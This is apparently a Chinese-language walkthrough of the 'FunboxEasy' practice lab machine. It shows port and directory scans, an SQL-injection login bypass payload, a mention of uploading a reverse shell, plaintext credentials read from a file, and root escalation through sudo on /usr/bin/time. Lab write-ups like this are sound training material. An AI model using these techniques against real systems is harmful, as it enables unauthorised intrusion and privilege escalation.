参考资料：  
[https://choodesmond42.medium.com/pg-play-funboxeasy-73be7abfc789](https://choodesmond42.medium.com/pg-play-funboxeasy-73be7abfc789)
    
[http://192.168.196.111/gym/](http://192.168.196.111/gym/)  
┌──(kali㉿kali)-[~/Desktop/pg02/FunboxEasy]  
└─$ nmap -T4 -p- -Pn 192.168.196.111  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-16 01:07 EST  
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 11.88% done; ETC: 01:14 (0:05:41 remaining)  
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 11.94% done; ETC: 01:14 (0:05:39 remaining)  
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 11.99% done; ETC: 01:14 (0:05:38 remaining)  
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 12.04% done; ETC: 01:14 (0:05:36 remaining)  
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan  
SYN Stealth Scan Timing: About 12.08% done; ETC: 01:14 (0:05:35 remaining)  
Nmap scan report for 192.168.196.111  
Host is up (0.10s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT STATE SERVICE  
22/tcp open ssh  
80/tcp open http  
33060/tcp open mysqlx
 
Nmap done: 1 IP address (1 host up) scanned in 407.60 seconds   ┌──(kali㉿kali)-[~/Desktop/pg02/FunboxEasy]  
└─$
   

目录扫描：  
gobuster dir -u 192.168.196.111 --wordlist /usr/share/wordlists/dirb/common.txt
 
┌──(kali㉿kali)-[~/Desktop/pg02/FunboxEasy]  
└─$ gobuster dir -u 192.168.196.111 --wordlist /usr/share/wordlists/dirb/common.txt  
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url: [http://192.168.196.111](http://192.168.196.111)  
[+] Method: GET  
[+] Threads: 10  
[+] Wordlist: /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes: 404  
[+] User Agent: gobuster/3.8  
[+] Timeout: 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.hta (Status: 403) [Size: 280]  
/.htaccess (Status: 403) [Size: 280]  
/.htpasswd (Status: 403) [Size: 280]  
/admin (Status: 301) [Size: 318] [--\> [http://192.168.196.111/admin/](http://192.168.196.111/admin/)]  
/index.php (Status: 200) [Size: 3468]  
/index.html (Status: 200) [Size: 10918]  
/robots.txt (Status: 200) [Size: 14]  
/secret (Status: 301) [Size: 319] [--\> [http://192.168.196.111/secret/](http://192.168.196.111/secret/)]  
/server-status (Status: 403) [Size: 280]  
/store (Status: 301) [Size: 318] [--\> [http://192.168.196.111/store/](http://192.168.196.111/store/)]  
Progress: 4613 / 4613 (100.00%)  
===============================================================  
Finished  
===============================================================   ┌──(kali㉿kali)-[~/Desktop/pg02/FunboxEasy]  
└─$
   

漏洞利用：  
searchsploit cse
   

通过网页端上传反向木马  
payload  
Payload:  
Name: admin  
Pass: %' or '1'='1
   

password.txt  
www-data@funbox3:/home/tony$ cat password.txt  
cat password.txt  
ssh: yxcvbnmYYY  
gym/admin: asdfghjklXXX  
/store: admin@admin.com admin  
www-data@funbox3:/home/tony$ ls  
ls  
password.txt  
www-data@funbox3:/home/tony$
 
www-data@funbox3:/var/www$ cat local.txt  
cat local.txt  
2226ae77091694466a1ca5596cdb6d2a  
www-data@funbox3:/var/www$
    
提权：  
ssh tony@192.168.196.111  
yxcvbnmYYY  
tony:yxcvbnmYYY
 
tony@funbox3:~$ sudo /usr/bin/time /bin/sh 提权命令  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cd /root  
# ls  
proof.txt root.flag snap  
# cat proof.txt  
3127c7d501c28fe814bb80d8d16a2079  
#